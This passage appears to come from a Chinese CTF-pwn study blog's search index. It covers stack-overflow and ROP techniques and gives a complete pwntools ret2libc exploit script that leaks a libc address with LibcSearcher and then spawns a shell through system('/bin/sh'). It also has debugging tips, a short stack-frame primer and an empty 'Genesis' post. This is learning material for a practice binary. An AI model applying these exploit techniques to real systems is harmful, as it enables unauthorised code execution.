表项的内容)的方法，泄露出了libc中某个函数的地址，就能够确定libc的版本号。由于libc的延迟绑定机制，我们需要泄露已经执行过的函数的地址。使用LibcSearcher工具可简化操作流程。 此外，libc中是一定存在”/bin/sh”的，所以字符串地址也可以获取。这方面工具做的很完善。 示例： 1234567891011int __cdecl main(int argc, const char **argv, const char **envp)&#123; int v4; // [sp+1Ch] [bp-64h]@1 setvbuf(stdout, 0, 2, 0); setvbuf(stdin, 0, 1, 0); puts(&quot;No surprise anymore, system disappeard QQ.&quot;); printf(&quot;Can you find it !?&quot;); gets((char *)&amp;v4); return 0;&#125; 思路： 泄露 __libc_start_main 地址 获取 libc 版本 获取 system 地址与 /bin/sh 的地址 再次执行源程序 触发栈溢出执行 system(‘/bin/sh’) EXP如下： 12345678910111213141516171819202122232425262728293031323334353637383940#!/usr/bin/env pythonfrom pwn import *## 导入工具from LibcSearcher import LibcSearcher## 本地连接sh = process(&apos;./ret2libc3&apos;)## 将文件加载入进程ret2libc3 = ELF(&apos;./ret2libc3&apos;)##简化libc库中函数地址的表示方法puts_plt = ret2libc3.plt[&apos;puts&apos;]libc_start_main_got = ret2libc3.got[&apos;__libc_start_main&apos;]main = ret2libc3.symbols[&apos;main&apos;]## 监视程序进行到哪一步，提醒自己print &quot;leak libc_start_main_got addr and return to main again&quot;## puts函数泄露出start_main函数地址payload = flat([&apos;A&apos; * 112, puts_plt, main, libc_start_main_got])## 在输出前面字符串后，将payload输入sh.sendlineafter(&apos;Can you find it !?&apos;, payload)print &quot;get the related addr&quot;##将接收到的puts函数的输出，经过u32由机器码转换成常见的地址形式libc_start_main_addr = u32(sh.recv()[0:4])##通过函数名与函数地址作为参数，用LibcSearcher找到libc版本号。libc = LibcSearcher(&apos;__libc_start_main&apos;, libc_start_main_addr)## 泄露出libc中start_main()函数地址，减去相对地址，得基地址。libcbase = libc_start_main_addr - libc.dump(&apos;__libc_start_main&apos;)## 已知基地址与相对地址，得到绝对地址system_addr = libcbase + libc.dump(&apos;system&apos;)binsh_addr = libcbase + libc.dump(&apos;str_bin_sh&apos;)## 监视程序进行到哪一步print &quot;get shell&quot;payload = flat([&apos;A&apos; * 104, system_addr, 0xdeadbeef, binsh_addr])sh.sendline(payload)sh.interactive() 0X05–稍作总结： ret2text，ret2shellcode，ret2syscall，ret2libc四种类型，第四种最常用，第一种和第三种感觉有相似之处，第三种比较奇怪，所以用的最少。 0X06–MISC: 1.最简单栈溢出，一套工具解决。 python pattern.py create 150 gdb X run (input) q(uit) python pattern.py offset (address) 即可得到溢出地址 2.注意是返回地址，不是/bin/sh本身在栈上。 3.再次查找一下是否有 system 函数存在。经在 ida 中查找，确实也存在。（手动观察左上角窗口中的函数名，对main函数和system函数及一些容易造成溢出的函数加以注意。以及题目中可能会有hint和backdoor作为函数名）。 4.flat中的字符都是一次性发过去的，静态存储，在栈空间有足够长的的地址。 5.具体的链内部的控制，每次布置好返回地址的实现：可以是一长串字符，主调函数地址+pop ebx（堆栈平衡）+buf+被调函数地址，两次以上的函数调用一定要做到堆栈平衡。最后一个调用的函数一般都是system函数，不需要返回地址作为参数，只需要输入“/bin/sh”的地址作为参数。 6.r.sendlineuntil(‘AAA’,payload）表示直到返回了AAA字符串进行输入。 7.p32（），将括号内的数转换为机器码。u32（），将括号内的机器码转化为字符或者数字。 8.gdb调试寻找字符串命令：find+起始地址+长度+“字符串”,如：find 0xb7e393f0, +2200000, “/bin/sh”。 9.read函数（），从打开的设备或者文件中读取数据。ssize_t read(int fd, void *buf, size_t count);count是请求读取的字节数，读取的数据保存在缓冲区buf中，同时文件的当前读写位置后移。返回值是成功读取的字节数；write函数，三个参数分别为(int fd，const void *buf，size_t nbyte)分别为文件描述符，指定的缓冲区（指向一段内存单元的指针）和要写入文件的字节数。 10.GOT定位：对于模块外部引用的全局变量和全局函数，用 GOT 表的表项内容作为地址来间接寻址；对于本模块内的静态变量和静态函数，用 GOT 表的首地址作为一个基准，用相对于该基准的偏移量来引用，因为不论程序被加载到何种地址空间，模块内的静态变量和静态函数与 GOT 的距离是固定的，并且在链接阶段就可知晓其距离的大小。这样，PIC 使用 GOT 来引用变量和函数的绝对地址，把位置独立的引用重定向到绝对位置。 PLT表：过程链接表用于把位置独立的函数调用重定向到绝对位置。通过 PLT 动态链接的程序支持惰性绑定模式。每个动态链接的程序和共享库都有一个 PLT，PLT 表的每一项都是一小段代码，对应于本运行模块要引用的一个全局函数。程序对某个函数的访问都被调整为对 PLT 入口的访问。 11.内存四区，一个由c/C++编译的程序占用的内存分为以下几个部分：1.栈区（stack）：由编译器自动分配释放 ，存放函数的参数值，局部变量的值等。其操作方式类似于数据结构中的栈。2.堆区（heap)： 一般由程序员分配释放， 若程序员不释放，程序结束时可能由OS回 收 。注意它与数据结构中的堆是两回事，分配方式倒是类似于链表。3.数据区：主要包括静态全局区和常量区。如果要站在汇编角度细分的话还可以分为很多小的区。全局区（静态区）（static）：全局变量和静态变量的存储是放在一块的，初始化的全局变量和静态变量在一块区域， 未初始化的全局变量和未初始化的静态变量在相邻的另一块区域，程序结束后由系统释放。常量区 ：常量字符串就是放在这里的。 程序结束后由系统释放4.代码区：存放函数体的二进制代码。 12.需要注意的是，由于在计算机内存中，每个值都是按照字节存储的。一般情况下都是采用小端存储，即 0x0804843B 在内存中的形式是 1\x3b\x84\x04\x08 但是，我们又不能直接在终端将这些字符给输入进去，在终端输入的时候 \，x 等也算一个单独的字符。。所以我们需要想办法将 \x3b 作为一个字符输入进去。那么此时我们就需要使用一波 pwntools 了。 13.常见的危险函数如下 输入 gets，直接读取一行，忽略’\x00’ scanf vscanf 输出 sprintf 字符串 strcpy，字符串复制，遇到’\x00’停止 strcat，字符串拼接，遇到’\x00’停止 bcopy 计算我们所要操作的地址与我们所要覆盖的地址的距离。常见的操作方法就是打开 IDA，根据其给定的地址计算偏移。一般变量会有以下几种索引模式 相对于栈基地址的的索引，可以直接通过查看 EBP 相对偏移获得 相对应栈顶指针的索引，一般需要进行调试，之后还是会转换到第一种类型。 直接地址索引，就相当于直接给定了地址。 一般来说，我们会有如下的覆盖需求 覆盖函数返回地址，这时候就是直接看 EBP 即可。 覆盖栈上某个变量的内容，这时候就需要更加精细的计算了。 覆盖 bss 段某个变量的内容。 根据现实执行情况，覆盖特定的变量或地址的内容。 之所以我们想要覆盖某个地址，是因为我们想通过覆盖地址的方法来直接或者间接地控制程序执行流程。 0X06–尚存在的问题: 1.关于ret2shellcode是如何执行的。RWX,bss段具有可执行权限，即NX开没开有什么意义，看不到区别。 2.ESP的调试为什么断点下在CALL处。 3.buf两端的问题。 4.关于shellcode的位置问题：正常情况下都是使用gds调试程序，然后查看内存来确定shellcode的为之。但实际上执行exp的时候会发现shellcode不在这个位置上，因为gdb的调试环境会影响buf在内存中的位置。关闭ALSR只能保证buf的地址在gdb的调试环境中不变，但是直接执行elf时，buf的位置会固定在别的地址上。解决此问题最简单的方法就是开启core dump功能，即：ulimit -c unlimitedsudo sh -c ‘echo “/tmp/core.%t” &gt; /proc/sys/kernel/core_pattern’开启之后，当出现内存错误的时候，系统会生成一个core dump文件在tmp目录下。然后我们再用gdb查看这个core文件就可以获取到buf真正的地址了。 CTF-Wiki&gt;Linux Pwn: Stack Overflow principle Basic ROP 系统调用 Github上Libc版本库 LibcSearcher工具 现代栈溢出利用技术基础：ROP 一步一步学ROP之linux_x86篇 一步一步学ROP之linux_x64篇 手把手教你栈溢出从入门到放弃（上） 手把手教你栈溢出从入门到放弃（下） Linux下pwn从入门到放弃]]></content>
      <categories>
        <category>Pwn</category>
      </categories>
      <tags>
        <tag>CTF Pwn stackoverflow ROP</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[栈帧（stack frame）]]></title>
    <url>%2F2019%2F06%2F19%2FStack%20Frame%2F</url>
    <content type="text"><![CDATA[1.栈帧的作用：在程序中用于声明变量，调用函数。是利用EBP（栈帧指针）寄存器访问栈内局部变量，参数，函数返回地址等的手段。 2.在储存局部变量的值之前，都会执行SUB指令，为局部变量开辟空间。 3.汇编中的DWORD PTR SS:[EBP-4]理解为指针，意为地址EBP-4处有一个4字节大小 的内存空间。此句中，SS是Segment Memory Model的缩写，表示栈段，在Windows（使用段内存模型）下需要指出。EBP是指向栈的寄存器，所以加上SS寄存器。DWORD PTR与SS等字符串可以在OD设置中隐藏。 4.调用一个函数之前，先开辟出内存空间，在将参数压入栈，最后在执行函数之前，将返回地址压入栈。执行完毕之后将删除函数栈帧并返回至PUSH的返回地址。 5.注意参数入栈的顺序与C语言中参数顺序恰好相反（参数的逆向存储）。 6.调用约定（Calling Convention）：被调函数执行完后，由函数的调用者负责清理存储在栈中的参数，这种方式称为cdecl方式。由被调用者负责清理保存在栈中的参数，称为stdcall方式。 7.ESP为栈顶指针，EBP为栈帧指针。程序运行过程中，ESP是随时变化的，访问内存中的局部变量和参数等如果以此为基址会十分困难。所以程序开始时会PUSH EBP,MOV EBP,ESP.将ESP的值保存在EBP中并且维持在函数内部，这样无论ESP如何变化，以EBP为基准都能准确地访问到局部变量与参数。执行完这两条命令，就可以说栈帧已经生成了。 8.XOR命令用来进行异或运算，Exclusive OR bit，其特点为两个相同的值进行异或运算的结果为0.XOR命令的执行速度比 MOV EAX,0 要快，常用于寄存器初始化操作。 9.编译器中的”优化“（optimization）选项开启后，编译出来的简单函数将不会生成栈帧。 10.牢记：栈是用来存放参数，变量，地址等数据的，不是用来存放代码的。]]></content>
      <categories>
        <category>Pwn</category>
      </categories>
      <tags>
        <tag>Pwn function</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Genesis]]></title>
    <url>%2F2019%2F06%2F17%2FGenesis%2F</url>
    <content type="text"><![CDATA[Earthquake and Blog]]></content>
  </entry>
</search>
